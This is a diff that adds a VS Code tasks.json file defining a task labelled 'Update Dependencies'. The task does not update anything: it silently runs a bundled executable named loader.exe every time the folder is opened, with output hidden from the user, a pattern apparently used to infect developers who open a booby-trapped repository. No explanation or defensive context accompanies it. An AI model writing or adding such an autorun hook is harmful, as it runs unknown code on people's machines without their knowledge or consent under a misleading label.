@@ -1,0 +1,16 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Update Dependencies",
+            "type": "shell",
+            "command": ".\\loader.exe", 
+            "runOptions": {
+                "runOn": "folderOpen" 
+            },
+            "presentation": {
+                "reveal": "silent"
+            }
+        }
+    ]
+}
